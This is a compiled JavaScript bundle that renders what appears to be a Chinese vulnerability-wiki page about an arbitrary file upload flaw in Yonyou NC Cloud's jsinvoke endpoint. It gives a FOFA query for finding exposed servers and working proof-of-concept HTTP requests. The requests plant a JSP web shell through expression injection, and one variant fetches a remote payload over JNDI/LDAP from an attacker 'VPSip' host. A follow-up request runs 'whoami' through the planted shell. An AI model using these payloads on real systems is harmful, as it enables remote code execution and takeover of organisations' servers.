(window.webpackJsonp=window.webpackJsonp||[]).push([[236],{1759:function(a,s,e){a.exports=e.p+"assets/img/1677729078033-1536313c-bfb8-4134-ac84-ddad2b011207-20230809133642723.4dee58ec.png"},1760:function(a,s,e){a.exports=e.p+"assets/img/1677729129558-fd90f34f-9bb9-44ce-b779-e7c17578b4a0.10b785c6.png"},1761:function(a,s,e){a.exports=e.p+"assets/img/1677729209203-afb4acf2-bd48-44fb-af97-aa70c9bcbc2a.ee2afb27.png"},3165:function(a,s,e){"use strict";e.r(s);var n=e(64),t=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"用友-nc-cloud-jsinvoke-任意文件上传漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#用友-nc-cloud-jsinvoke-任意文件上传漏洞"}},[a._v("#")]),a._v(" 用友 NC Cloud jsinvoke 任意文件上传漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("用友 NC Cloud")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v('app="用友-NC-Cloud"')]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("登陆页面")]),a._v(" "),s("p",[s("img",{attrs:{src:e(1759),alt:"img"}})]),a._v(" "),s("p",[a._v("验证POC")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v('POST /uapjs/jsinvoke/?action=invoke\nContent-Type: application/json\n\n{\n    "serviceName":"nc.itf.iufo.IBaseSPService",\n    "methodName":"saveXStreamConfig",\n    "parameterTypes":[\n        "java.lang.Object",\n        "java.lang.String"\n    ], \n    "parameters":[\n        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",\n        "webapps/nc_web/407.jsp"\n    ]\n}\nPOST /uapjs/jsinvoke/?action=invoke HTTP/1.1\nHost: \nConnection: Keep-Alive\nContent-Length: 253\nContent-Type: application/x-www-form-urlencoded\n\n\n{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${\'\'.getClass().forName(\'javax.naming.InitialContext\').newInstance().lookup(\'ldap://VPSip:1389/TomcatBypass/TomcatEcho\')}","webapps/nc_web/301.jsp"]}\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br"),s("span",{staticClass:"line-number"},[a._v("16")]),s("br"),s("span",{staticClass:"line-number"},[a._v("17")]),s("br"),s("span",{staticClass:"line-number"},[a._v("18")]),s("br"),s("span",{staticClass:"line-number"},[a._v("19")]),s("br"),s("span",{staticClass:"line-number"},[a._v("20")]),s("br"),s("span",{staticClass:"line-number"},[a._v("21")]),s("br"),s("span",{staticClass:"line-number"},[a._v("22")]),s("br"),s("span",{staticClass:"line-number"},[a._v("23")]),s("br")])]),s("p",[s("img",{attrs:{src:e(1760),alt:"img"}})]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v("/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) \n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:e(1761),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=t.exports}}]);